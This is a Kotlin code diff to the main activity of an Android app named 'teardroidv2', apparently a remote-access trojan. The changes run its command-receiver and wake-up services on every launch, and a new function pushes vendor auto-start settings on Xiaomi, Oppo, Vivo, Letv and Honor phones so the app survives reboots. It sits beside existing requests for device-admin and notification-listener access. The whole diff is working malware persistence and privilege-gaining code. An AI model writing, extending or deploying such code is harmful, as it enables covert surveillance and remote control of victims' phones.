@@ -1,6 +1,8 @@
 package com.example.teardroidv2
 
 import android.Manifest
+import android.annotation.SuppressLint
+import android.app.Application
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -18,34 +20,34 @@ import androidx.core.app.ActivityCompat
 
 
 class MainActivity : AppCompatActivity() {
-    val TAG = AppInfo.TAG
 
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP_MR1)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
-        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        this.requestWindowFeature(Window.FEATURE_NO_TITLE)
+        this.window.setFlags(
+            WindowManager.LayoutParams.FLAG_FULLSCREEN,
+            WindowManager.LayoutParams.FLAG_FULLSCREEN
+        )
         supportActionBar?.hide()
         setContentView(R.layout.activity_main)
-        checkPermission();
+        checkPermission()
         val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
         if(isFirstRun.getBoolean(AppInfo.FirstRunKey,true)) {
-            Log.d(TAG,"First run successfully")
-            val commandReciverService = CommandReciver::class.java
-            val commandrecive = Intent(applicationContext, commandReciverService)
-            startService(commandrecive)
+            addAutoStartup()
             getDeviceAdminPermission()
-            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             val changeRunEntry = isFirstRun.edit()
             changeRunEntry.putBoolean(AppInfo.FirstRunKey,false)
             changeRunEntry.apply()
-        }else{
-            Log.d(TAG,"Teardroid service is already running")
         }
-
+        val commandReciverService = CommandReciver::class.java
+        val commandrecive = Intent(applicationContext, commandReciverService)
+        startService(commandrecive)
+        startService(Intent(applicationContext,JobWakeUpService::class.java))
     }
 
-    private fun getDeviceAdminPermission(){
+    private fun getDeviceAdminPermission() {
         val mDeviceAdminSample = ComponentName(this, DevAdminReceiver::class.java)
         val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
         intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample)
@@ -87,6 +89,53 @@ class MainActivity : AppCompatActivity() {
             }
         }
         return true
+    }
+
+    @SuppressLint("QueryPermissionsNeeded")
+    private fun addAutoStartup() {
+        try {
+            val intent = Intent()
+            val manufacturer = Build.MANUFACTURER
+            when {
+                "xiaomi".equals(manufacturer, ignoreCase = true) -> {
+                    intent.component = ComponentName(
+                        "com.miui.securitycenter",
+                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
+                    )
+                }
+                "oppo".equals(manufacturer, ignoreCase = true) -> {
+                    intent.component = ComponentName(
+                        "com.coloros.safecenter",
+                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
+                    )
+                }
+                "vivo".equals(manufacturer, ignoreCase = true) -> {
+                    intent.component = ComponentName(
+                        "com.vivo.permissionmanager",
+                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
+                    )
+                }
+                "Letv".equals(manufacturer, ignoreCase = true) -> {
+                    intent.component = ComponentName(
+                        "com.letv.android.letvsafe",
+                        "com.letv.android.letvsafe.AutobootManageActivity"
+                    )
+                }
+                "Honor".equals(manufacturer, ignoreCase = true) -> {
+                    intent.component = ComponentName(
+                        "com.huawei.systemmanager",
+                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
+                    )
+                }
+            }
+            val list =
+                packageManager.queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY)
+            if (list.size > 0) {
+                startActivity(intent)
+            }
+        } catch (e: Exception) {
+            Log.e(AppInfo.TAG, e.toString())
+        }
     }
 
 }
